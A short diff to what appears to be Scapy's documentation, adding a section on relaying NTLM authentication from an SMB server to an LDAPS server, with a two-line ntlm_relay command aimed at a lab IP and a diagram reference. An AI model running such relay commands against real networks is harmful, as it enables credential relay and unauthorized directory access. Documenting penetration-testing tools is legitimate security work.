@@ -103,3 +103,14 @@ _________________________________________________
 
 .. image:: ../graphics/ntlm/ntlmrelay_ldap.png
    :align: center
+
+SMB2 <-> LDAPS: relay SMB's NTLM to an LDAPS server
+___________________________________________________
+
+.. code::
+
+    load_layer("ldap")
+    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAPS_Client, iface="virbr0")
+
+.. image:: ../graphics/ntlm/ntlmrelay_ldaps.png
+   :align: center
